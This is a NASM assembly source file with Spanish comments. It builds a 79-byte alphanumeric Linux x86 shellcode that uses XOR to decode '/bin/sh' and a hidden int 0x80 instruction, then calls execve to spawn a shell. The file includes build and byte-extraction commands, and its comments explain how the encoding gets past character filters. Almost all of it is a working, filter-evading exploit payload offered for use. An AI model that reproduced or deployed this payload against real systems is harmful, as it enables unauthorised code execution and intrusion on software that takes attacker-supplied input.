; Shellcode: hzzzzYAAAAAA0HM0hN0HNhu12ZX5ZBZZPhu834X5ZZZZPTYhjaaaX5aaaaP5aaaa5jaaaPPQTUVWaMz
; Longitud: 79 bytes
;
; En este codigo, solo se usaran los siguientes caracteres: a-z A-Z 0-9
; Para 0-9: \x30-\x39
; Para A-Z: \x41-\x5a
; Para a-z: \x61-\x7a
;
; Comando de compilacion:
; nasm -f elf shellcode_linux_x86_alfanumerico.nasm; ld -m elf_i386 -s -o shellcode_linux_x86_alfanumerico shellcode_linux_x86_alfanumerico.o; objdump -d ./shellcode_linux_x86_alfanumerico|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
;
; (PROMO) Ha sido mucho mas facil crear este shellcode gracias a: https://defuse.ca/online-x86-assembler.htm
; (GUIAS) Donde aprender como realizar Shellcode alfanumerico: http://phrack.org/issues/57/15.html



; Usamos edx para descifrar int 0x80 cifrado con XOR.
; Aqui eax tiene guardada la direccion de la primera instruccion del shellcode. El int 0x80 ocupa dos bytes y esta alojado en el penultimo y ultimo byte
;   DESCIFRAMOS PRIMER BYTE DEL INT 0x80 (Guardado como 0x4d, tiene que acabar valiendo 0xcd): Guardamos el byte imprimible mas alto en el stack  
push 0x7a7a7a7a                ; 68 7a 7a 7a 7a = h z z z z
pop  ecx                       ; 59 = Y
; Lo incrementamos 6 veces hasta llegar a 0x80
inc ecx                        ; 41 = A
inc ecx                        ; 41 = A
inc ecx                        ; 41 = A
inc ecx                        ; 41 = A
inc ecx                        ; 41 = A
inc ecx                        ; 41 = A
; Desciframos ese primer byte: 0x4d ^ 0x80 = 0xcd
xor  BYTE [eax + 0x4d], cl ; 30 48 38 = 0 H 8
;   DESCIFRAMOS SEGUNDO BYTE DEL INT 0x80 (Guardado como 0x7a, tiene que acabar valiendo 0x80)
; Primero le realizamos xor con el registro ecx (En concreto ch, que todavia vale 0x7a): 0x7a ^ 0x7a = 0x00
xor  BYTE [eax + 0x4e], ch ; 30 68 39 = 0 h 9
; Usamos xor para guardar el byte del registro ecx (En concreto cl, que vale 80): 0x00 ^ 0x80 = 0x80
xor  BYTE [eax + 0x4e], cl ; 30 48 39 = 0 H 9
; 21 bytes usados en este bloque de codigo


; Guardar string "/bin/sh\0" en el stack
; Como no se pueden meter en el shellcode ni el caracter '/' ni el Null Byte, se introducira una String cifrada y se descifrara con XOR
;    Primer DWORD de la String
; 'Z21u' ^ 'ZZBZ' = '\0hs/'
; - descifrado: 0x5a323175 ^ 0x5a5a425a
push 0x5a323175      ; 68 75 31 32 5a = h u 1 2 Z
pop  eax             ; 58             = X
xor  eax, 0x5a5a425a ; 35 5a 42 5a 5a = 5 Z B Z Z
push eax             ; 50             = P
;    Segundo  DWORD de la String
; '438u' ^ 'ZZZZ' = 'nib/'
; - descifrado: 0x34333875 ^ 0x5a5a5a5a
push 0x34333875      ; 68 75 38 33 34 = h u 8 3 4
pop  eax             ; 58             = X
xor  eax, 0x5a5a5a5a ; 35 5a 5a 5a 5a = 5 Z Z Z Z
push eax             ; 50             = P
; 24 bytes usados en este bloque de codigo


; Hacer que ECX apunte al inicio de la String ('/bin/sh\0'). Luego le daremos este valor a EBX y ECX valdra 0x00000000
push esp ; 54 = T
pop  ecx ; 59 = Y
; 2 bytes usados en este bloque de codigo


; Dar a EAX el valor 11
push 0x6161616a      ; 68 6a 61 61 61 = h j a a a
pop  eax             ; 58             = X
xor  eax, 0x61616161 ; 35 61 61 61 61 = 5 a a a a
; 11 bytes usados en este bloque de codigo


; Limpiar EDX y darle a EBX el valor de ECX mediante "popad", y hacer que ECX valga 0x00000000
push eax ; 50 = P ; EAX no cambia
; Cambiamos el valor de EAX de 0xb a 0x0, para darle este valor a EDX y a ECX
xor  eax, 0x61616161 ; 35 61 61 61 61 = 5 a a a a
xor  eax, 0x6161616a ; 35 6a 61 61 61 = 5 j a a a
; Seguimos guardando el resto del valores para el popad
push eax ; 50 = P ; ECX = EAX nuevo (EAX = 0x0)
push eax ; 50 = P ; EDX = EAX nuevo (EAX = 0x0)
push ecx ; 51 = Q ; EBX = ECX (Direccion de memoria de la String '/bin/sh\0')
push esp ; 54 = T ; ESP no cambia (En realidad ESP siempre se ignora en popad, por eso no cambia)
push ebp ; 55 = U ; EBP no cambia
push esi ; 56 = V ; ESI no cambia
push edi ; 57 = W ; EDI no cambia
popad    ; 61 = a ; Se guardan todos esos registros (Ignorando ESP)
; 19 bytes usados en este bloque de codigo

; Se ejecuta execve
dw 0x7a4d ; 4d 7a = M 7a ; Cuando se descifre, resulta en la instruccion: int 0x80  ->  cd 80 (Bytes no imprimibles)
; 2 bytes usados en este bloque de codigo